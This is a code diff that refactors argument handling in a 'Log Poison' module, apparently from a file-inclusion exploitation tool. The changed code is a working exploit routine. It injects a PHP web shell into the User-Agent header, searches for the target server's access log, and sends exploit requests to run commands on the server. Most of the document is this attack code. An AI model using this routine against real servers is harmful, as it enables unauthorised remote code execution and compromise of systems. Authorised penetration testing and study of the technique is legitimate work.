@@ -1,7 +1,7 @@
 """Log Poison"""
 import os
 
-from src.utils.arguments import ArgumentHandler
+from src.utils.arguments import init_args
 from src.httpreqs import request
 from src.configs import config
 from src.utils.args_check import scriptDirectory
@@ -13,11 +13,11 @@ from src.utils.info import printInfo
 def exploit_log_poison(
     ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post
 ):
-    args = ArgumentHandler()
-    if args.args['f']:
+    args  = init_args()
+    if args['f']:
         return
 
-    maliciousHeaders = args.args['httpheaders'].copy()
+    maliciousHeaders = args['httpheaders'].copy()
     maliciousHeaders["User-Agent"] = "<?php system($_GET['c']); ?>"
     lastPrintedStringLen = 0
 
@@ -50,7 +50,7 @@ def exploit_log_poison(
             if post:
                 res, _ = request.REQUEST(
                     url,
-                    args.args['httpheaders'],
+                    args['httpheaders'],
                     post.replace(config.tempArg, line),
                     config.proxies,
                     "",
@@ -60,7 +60,7 @@ def exploit_log_poison(
             else:
                 res, _ = request.REQUEST(
                     url.replace(config.tempArg, line),
-                    args.args['httpheaders'],
+                    args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -68,7 +68,7 @@ def exploit_log_poison(
                     exploit=True,
                 )
 
-            if args.args['httpheaders']["User-Agent"] in res.text:
+            if args['httpheaders']["User-Agent"] in res.text:
                 lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
                 print(
                     "\n"
@@ -116,7 +116,7 @@ def exploit_log_poison(
                 print(exploitUrl)
                 res, _ = request.REQUEST(
                     exploitUrl,
-                    args.args['httpheaders'],
+                    args['httpheaders'],
                     post,
                     config.proxies,
                     "",
@@ -134,7 +134,7 @@ def exploit_log_poison(
                         )
                         request.REQUEST(
                             url,
-                            args.args['httpheaders'],
+                            args['httpheaders'],
                             exploitPost,
                             config.proxies,
                             "",
@@ -150,7 +150,7 @@ def exploit_log_poison(
                             request.REQUEST(
                                 url,
                                 exploitPost,
-                                args.args['httpheaders'],
+                                args['httpheaders'],
                                 config.proxies,
                                 "",
                                 "",
@@ -169,7 +169,7 @@ def exploit_log_poison(
                         )
                         request.REQUEST(
                             exploitUrl,
-                            args.args['httpheaders'],
+                            args['httpheaders'],
                             post,
                             config.proxies,
                             "",
@@ -189,7 +189,7 @@ def exploit_log_poison(
                             )
                             request.REQUEST(
                                 exploitUrl,
-                                args.args['httpheaders'],
+                                args['httpheaders'],
                                 post,
                                 config.proxies,
                                 "",
@@ -199,7 +199,7 @@ def exploit_log_poison(
                         break
         else:
             # lastPrintedStringLen = printFancyString("", lastPrintedStringLen)
-            if args.args['verbose']:
+            if args['verbose']:
                 printFancyString(
                     colors.red("[-]")
                     + " Couldn't locate target server's access log to poison or log is not readable.\n",
